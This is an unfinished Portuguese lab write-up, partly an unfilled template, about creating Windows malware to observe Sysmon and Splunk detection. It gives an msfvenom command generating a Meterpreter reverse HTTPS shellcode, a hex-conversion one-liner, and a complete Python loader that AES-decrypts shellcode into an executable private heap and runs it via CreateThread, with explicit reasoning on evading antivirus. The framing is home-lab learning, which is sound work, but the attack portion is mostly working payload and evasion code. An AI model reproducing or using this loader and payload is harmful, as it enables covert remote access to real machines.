# 🛡️ [TÍTULO DO ARTIGO AQUI]
> *Exemplo: Detectando Injeção de DLL com Sysmon e Splunk*

## 📌 Resumo
Neste eu criei um malware usando veil e apliquei algumas tecnicas de obfuscacao e encryptacao com o objetivo de passar pela seguranca de uma 
virtual machine e observar a reacao do sistema de defesa e os logs gerados por splunk e sysmon infelizmente (ou felizmente) o malware foi detectado pelo sistema windows 
assim que foi baixado, entretanto todo o processo de criacao e execucao geraram muito conhecimento pratico que eu vou registrar aqui.  

---

## ⚙️ Ambiente de Testes

| Componente     | Detalhes                                          |
|----------------|---------------------------------------------------|
| Atacante       | Kali Linux (versão XX)                            |
| Alvo           | Windows 10 (versão XX) com Sysmon                 |
| Ferramentas    | Splunk, Sysmon, Wine, Veil, Python, Metasploit    |
| Técnica usada  | Reverse Shell / etc.  |

---


## 🧪 DETALHES TECNICOS 
 Durante a instalacao do Splunk eu tive alguns problemas para recebecer os logs sysmon no splunk GUI depois de muito procurar eu descobri que 
 era um problema de permissoes do windows 

 (PRINT DO PROGRAMA SERVICES/SPLUNK)

 E necessario que se insira este comando no arquivo input do splunk para receber os logs 

 (PRINT DO ARQUIVO DE CONFIGURACAO SPLUNK)



## 🧪 SOBRE O MALWARE E OFUSCACAO 
 Para este artigo eu escolhi usar um shellcode metasploist e obfusca-lo com codigo python para este proposito foi escolhido esta opcao 
  Este comando vai gerar um shellcode em .raw format pronto para converte-lo em hexadecimal string

```xml msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.56.103 LPORT=3135 -f raw -o result3.raw```

(PRINT PAYLOAD metasploit)

comando para converter o resultado em codigo hexadecimal 

```xml  xxd -p result3.raw | tr -d '\n' | sed 's/\(..\)/\\x\1/g' > result03.txt ```

   (PRINT DA ENCRIPTACAO HEXADECIMAL)

  Logo apos eu usei este codigo python para converter a saida do comando anterior em uma versao encryptada usando uma chave AES de 16 bytes (128 bits),
  isso vai ajudar bypass o sistema de defesa do windows tornando mais dificil para o antivirus indentificar o codigo malicioso dentro do executavel 

[PRINT DO VS CODE ENCRYPTACAO]

Agora nos temos um shellcode pronto para ser inserido no codigo 

**Diferenca entre ```xml VirtualAlloc``` e ```xml HeapAlloc```**     
    Enquanto estudava para montar este malware me deparei com duas opcoes sobre como o malware iria alocar memoria no sistema alvo 
 pelo o que eu entendi ```xml VitualAlloc``` aloca grandes blocos de memoria deixando tudo pronto para que o codigo ja seja executado,
 e muito usado por sistemas complexos entretanto deixa muito rastros no sistema (```xml xmlVirtualAlloc + WriteProcessMemory + CreateRemoteThread```)e por ja ter sido muito usada
 ja e conhecida por antivirus.
 
 s2  ```xml HeapAlloc``` por outro lado usa um pedaco pequeno da memoria disponivel e e metodo muito usado pela maioria dos programas isso torna essa opcao 
 muito menos suspeita o ponto negativo e que o pedaco de memoria alocado inicialmente nao pode executar o codigo entao e necessario a execucao de outro comando depois ```xml HEAP_CREATE_ENABLE_EXECUTE```
 para liberar a execucao. Como o objetivo e bypass as defesas do windows eu escolhi a segunda opcao.

 **NOTE:** Enquanto escrevia este artigo descobri que a opcao  ```VirtualAlloc + VirtualProtect``` pode ser mais eficiente em bypass o sistema de defesa, vou testar isso em artigos futuros 

 Esse foi o codigo adquirido na internet para descriptografar um shellcode usando AES-CBC, 
 alocar memória executável em uma heap privada no processo atual e executa o shellcode via CreateThread:

 ```Python
import base64
import ctypes
from Crypto.Cipher import AES

# === KEY AND IV (must match those used during encryption) ===
key = b'ThisIsA16ByteKey'
iv = b'ThisIsA16ByteIV!'

# === Encrypted shellcode (base64) ===
encrypted_b64 = b"2G8Rv5XtiV6HwQS/DsUBAOQB+pUlMLPJ+KwsV9Ixm8ym6BdI7s5kNf0Qw++2d7qKp3ykcrNXnodX8a"
encrypted = base64.b64decode(encrypted_b64)

# === Decrypt using AES-CBC ===
cipher = AES.new(key, AES.MODE_CBC, iv)
decrypted = cipher.decrypt(encrypted)

# === Remove PKCS7 padding ===
pad_len = decrypted[-1]
shellcode = decrypted[:-pad_len]

# === Create a private heap ===
heap = ctypes.windll.kernel32.HeapCreate(0x00040000, len(shellcode), 0)  # HEAP_CREATE_ENABLE_EXECUTE
if not heap:
    raise Exception("HeapCreate failed")

# === Allocate executable memory in the heap ===
ptr = ctypes.windll.kernel32.HeapAlloc(heap, 0x00000008, len(shellcode))  # HEAP_ZERO_MEMORY
if not ptr:
    raise Exception("HeapAlloc failed")

# === Copy shellcode to the heap ===
ctypes.windll.kernel32.RtlMoveMemory(
    ctypes.c_void_p(ptr),
    shellcode,
    len(shellcode)
)

# === Execute the shellcode ===
ht = ctypes.windll.kernel32.CreateThread(
    None,
    0,
    ctypes.c_void_p(ptr),
    None,
    0,
    None
)

ctypes.windll.kernel32.WaitForSingleObject(ht, -1)
 ```
    





1. **Objetivo da simulação**
2. **Comando executado pelo atacante**
3. **Expectativa (o que deve ser gerado no log)**

---

## 🔍 Coleta e Análise dos Logs

### 📁 Sysmon - Configuração
Trecho da config usada (ou link para ela).

```xml
<!-- Exemplo -->
<EventFiltering>
  <ProcessCreate onmatch="include">
    <Image condition="contains">rundll32.exe</Image>
  </ProcessCreate>
</EventFiltering>
